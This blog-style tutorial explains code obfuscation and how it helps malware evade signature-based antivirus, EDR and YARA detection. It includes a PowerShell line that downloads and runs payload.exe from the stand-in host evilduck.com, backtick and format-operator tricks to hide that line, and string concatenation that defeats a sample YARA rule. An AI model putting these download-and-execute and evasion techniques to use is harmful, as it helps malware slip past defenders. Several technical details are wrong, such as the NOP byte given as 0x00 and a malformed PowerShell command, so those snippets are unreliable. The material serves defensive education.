---
layout: post
title: "Code Obfuscation"
author: "Rubber Ducky"
categories: cybersecurity
tags: [cybersecurity, programming, malware, reverse-engineering]
image: code.jpeg
permalink: /cybersecurity/code-obfuscation
---

### Obfuscation Overview

__Obfuscation__<br>
_noun_ - the action of making something obscure, unclear, or unintelligible.

Code obfuscation has two main use cases:
* Hiding code to prevent reverse engineering of intellectual property or trade secrets
     >The game Minecraft uses code obfuscation to hide its source code. Minecraft uses the [ProGuard Tool](https://github.com/Guardsquare/proguard), which is an obfuscator for classes in Java bytecode.

* Preventing anti malware and security analysts from detecting and protecting against malware
    > One notable example of this was the 2020 SolarWinds attacks. Threat actors injected some discrete, obfuscated code into DLL files. Microsoft produced an [excellent report](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/) detailing this attack.

Code obfuscation can be as simple as encrypting code, replacing variable and class names with meaningless labels, or adding random chunks of code that do absolutely nothing. As a small example, consider the following JavaScript.

{% highlight js %}
var greeting = 'Hello World';
greeting = 10;
var product = greeting * greeting;
{% endhighlight %}

This is a simple script, and easy for humans to read and follow the logic. It can be obfuscated as follows:

{% highlight js %}
var _0x154f=['98303fgKsLC','9koptJz','1LFqeWV','13XCjYtB','6990QlzuJn','87260lXoUxl','2HvrLBZ',
'15619aDPIAh','1kfyliT','80232AOCrXj','2jZAgwY','182593oBiMFy','1lNvUId','131791JfrpUY'];var _0x52df=function(_0x159d61,_0x12b953){_0x159d61=_0x159d61-0x122;var _0x154f4b=_0x154f[_0x159d61];return _0x154f4b;};(function(_0x19e682,_0x2b7215){var _0x5e377c=_0x52df;while(!![]){try{var _0x2d3a87=-parseInt(_0x5e377c(0x129))*parseInt(_0x5e377c(0x123))+-parseInt(_0x5e377c(0x125))*parseInt(_0x5e377c(0x12e))+parseInt(_0x5e377c(0x127))*-parseInt(_0x5e377c(0x126))+-parseInt(_0x5e377c(0x124))*-parseInt(_0x5e377c(0x12f))+-parseInt(_0x5e377c(0x128))*-parseInt(_0x5e377c(0x12b))+parseInt(_0x5e377c(0x12a))*parseInt(_0x5e377c(0x12d))+
parseInt(_0x5e377c(0x12c))*parseInt(_0x5e377c(0x122));if(_0x2d3a87===_0x2b7215)break;else _0x19e682['push'](_0x19e682['shift']());}catch(_0x22c179){_0x19e682['push'](_0x19e682['shift']());}}}(_0x154f,0x1918c));var greeting='Hello\x20World';greeting=0xa;var product=greeting*greeting;
{% endhighlight %}

This behemoth of a script does exactly the same thing, and is near impossible for a human to understand. If you want to see some more interesting examples, [This StackExchange thread](https://codegolf.stackexchange.com/questions/22533/weirdest-obfuscated-hello-world) has many examples of obfuscating the string ```hello world```.


Some of the biggest obstacles to malware developers are antivirus engines and EDR (endpoint detection and response) systems. These detect malware based on a database of stored signatures. Antivirus and EDR systems deserve an entire article of their own, but two methods they use to detect malware are static signatures and heuristic signatures.
* __Static signatures__ compare suspected malware code to a database of known malware samples, and flags up any matches.
* __Heuristic signatures__ can detect malware code by searching for suspicious features

Obfuscation helps to evade signature-based detection by ensuring any developed malware does not match any known signatures.

Some common methods of code obfuscation include:
* __Renaming__ - changing the names of variables and classes to meaningless identifiers, sometimes including unprintable or invisible characters
* __Packing__ - compressing the entire program so that it is unreadable
* __Control flow__ - changing the flow of logic in the program to create ‘spaghetti logic’, which is difficult to follow
* __Instruction pattern transformation__ - replacing commonly used simple instructions with uncommon, more complicated instructions that do the same thing
* __Dummy code__ - inserting code that does absolutely nothing but confuses the reader
* __Metadata removal__ - stripping the code of any metadata and comments designed to make the program easy to read
* __Opaque predicates__ - inserting conditional statements (if-then-else statements) that always evaluate in the same way, that seem meaningless to an analyst
* __Anti-tamper and anti-debug__ - tools that prevent anyone from running debug tools or modifying the code by stopping the program
* __Encryption__ - strings can be encrypted, and only decrypted when they are needed during runtime
* __Code transposition__ - reordering sections of code so that the ordering makes no sense, but the code is still functional

There are many other methods of code obfuscation out there, the above are a few of the most common. In the rest of this post, I will go deeper into code obfuscation and some obfuscation methods.

### A Layered Approach

[This paper](https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf) provides a detailed methodology for software obfuscation. It includes a taxonomy of obfuscation layers, much like the OSI model. The linked paper is a fascinating read, and details many more methods of obfuscation.

![alt text](\assets\img\cybersecurity\code_obfuscation\layers.PNG)

* Code-Element Layer
    * This layer aims to obfuscate code itself, as discussed above.
* Software-Component Layer
    * This layer aims to obfuscate entire software packages or executables, like a Java library or ELF files (executable file format - executable files often used on Linux systems)
* Inter-Component Layer
    * This layer aims to obfuscate interfaces between different software packages, for example library calls and resource encryption
* Application Layer
    * This layer is more specific to the application at hand, for example obfuscating neural networks, or DRM (digital rights management) systems. DRM systems are often used to prevent pirates from gaining cracked versions of movies and video games.

For the rest of this article, I will be focusing on the code-element layer. Perhaps the other layers will appear in a future post.

The code-element layer can be further split into four sublayers, each with their own obfuscation methods.

![alt text](\assets\img\cybersecurity\code_obfuscation\code_layers.PNG)

One of the most useful groups of obfuscation methods is the ‘obfuscating data’ layer. This group of methods aims to hide important identifiable data, and focus on hiding common data types, such as integers, strings and arrays.

The paper has given four main methods for obfuscating data:

__Array transformation__ - methods include splitting one array into multiple arrays, and merging multiple arrays together, flattening arrays to reduce their dimension, and folding arrays to increase their dimension

__Data encoding__ - use mathematical encoding algorithms or ciphers to make the data unreadable

__Data proceduralization__ - replacing static data with function calls, for example replacing all strings with a function that can generate all strings based on its parameters. Another method is replacing numbers with the values of invertible function.
>For example, if we have the strings ‘apple’, ‘bandana’ and ‘ducks’ in our code, define a function f with return values f(0) = ‘apple’, f(1) = ‘bandana’ and f(2) = ‘ducks’.

__Data splitting/merging__ - much like splitting and merging arrays, this method transforms other data types. For example, a boolean variable can be distributed into multiple booleans with the same logical output

### String Concatenation

One simple programming concept that can be exploited is string concatenation. Most programming languages allow you to concatenate, or join, two or more strings together. For example, the below code snippet shows string concatenation in Python, which uses the ```+``` operator to denote concatenation.

{% highlight python %}
s1 = 'rubber'
s2 = 'ducky'
print(s1+s2)
>> 'rubberducky'
{% endhighlight %}

Wikipedia has a [list of string concatenation operators](https://en.wikipedia.org/wiki/Comparison_of_programming_languages_(strings)) for various programming languages. Python, C#, C++, Java and PowerShell all support the ```+``` operator. PowerShell also supports ```,``` and ```$```, C# also supports ```String.Join``` and ```String.Concat```, and C supports the operator ```strcat```.

Static signatures can be evaded by exploiting concatenation. An attacker can break up strings included in code to evade any signatures looking for them, and concatenate the string back together during runtime.

For example, consider the following Yara rule. Yara is an intrusion and detection system, or IDS, that includes the use of signatures to trigger alerts for suspicious activity.

{% highlight xml %}
rule rubberduckyrule {
   strings:
      $text_string = ‘powershell.exe’
	  $hex_string = { 70 6F 77 65 72 73 68 65 6C 6C 2E 65 78 65 }

   condition:
      $text_string or $hex_string
}
{% endhighlight %}

This Yara rule will look for any instances of ```powershell.exe``` (or the hex equivalent) in malware code, and raise an alert on any positive instances. Using string concatenation, we can evade this Yara rule! Suppose we have the following line of C# code in our malware:

{% highlight c# %}
System.Diagnostics.Process.Start("powershell.exe")
{% endhighlight %}

The ```powershell.exe``` string can be obfuscated into the following line:

{% highlight c# %}
System.Diagnostics.Process.Start("po"+"w"+"ers"+"he"+"l"+".e"+"xe")
{% endhighlight %}

The first line would trigger a Yara alert, but the second line would evade it completely! If we couple this methods some of the previously mentioned methods for data obfuscation, such as data proceduralization, this code would be incredibly difficult to detect by static signature-based IDSs.

### More String Obfuscation

We can take the string concatenation method further by introducing non-interpreted characters. PowerShell scripts are particularly vulnerable to this method.

For example, we can introduce escaping characters, such as ``` ` ``` to strings. This will break the string up and evade any static signature-based detection systems. For example, consider the powershell command

{% highlight powershell %}
(New-Object System.Net.WebClient ).DownloadFile('http://evilduck.com/payload.exe') ; Start-Process("$env:APPDATA\payload.exe)
{% endhighlight %}

This Powershell script will connect to ```http://evilduck.com```, download the file ```payload.exe```, and execute it. If an IDS has a signature for ```evilduck.com``` or ```payload.exe```, it’s game over for the malware developer.

Using escape characters, the url in the script can be obfuscated to become

```
h`ttp://evi`ld`uc`k`.co`m/p`ayl`oa`d
```

Powershell will ignore the ``` ` ``` characters when executing, so the original payload executable will still be downloaded and executed. However, this is now much harder for a signature-based IDS to detect the script.

Another method in Powershell obfuscation is reordering, with the format operator ```-f```. For example, the string ```payload.exe``` can be obfuscated to

```
{1}{0} -f ‘oad.exe’, ‘payl’
```

Other methods include randomly adding upper and lowercase letters to strings, and inserting random whitespaces between words. A combination these, concatenation, escape characters, reordering and other non-interpreted characters, and other string-based obfuscation methods can make life for static signature-based IDSs pretty difficult.

As great as these methods are at evading IDSs, a skilled human would still be able to understand data obfuscated by code (probably after a lot of caffeine). For this reason, we turn to some more methods of code obfuscation.

Going back to the taxonomy outlined above, we now look at some more sublayers of the code-element layer.

### Code Layout Obfuscation

![alt text](\assets\img\cybersecurity\code_obfuscation\layout_layers.PNG)


The ‘obfuscating layout’ sublayer attempts to completely mess up the layout of a program. The following methods can be used:

 __Meaningless identifiers__ - completely disregard any logical naming conventions you use, and scramble them all up.
>In C and C++, the names of global variables and functions are still stored in compiled binaries, and Java bytecode still keeps names. This method is also known as lexical obfuscation.

__Stripping redundant symbols__ - many compiled programs contain metadata not used in runtime, but used to debug code. This can be removed to make reverse engineering a truly cumbersome process.
>For example, compiled ELF files have symbol tables stored in the .symbtab section, containing identifier-address pairs. This symbol table is only used to debug programs, so can be removed with the command ```strip --strip-uneeded [target.elf]```

__Separating related codes__ - this method aims to shuffle parts of a program that are logically related.
>For example, using numerous unconditional jumps in assembly code using the goto command (or equivalent)

__Junk Code__ - add instructions and methods which have no functionality.
>For example, in binaries no-operation instructions (```NOP``` or ```0x00```) can be inserted. This will make code hard to read, and change the signature of the program.
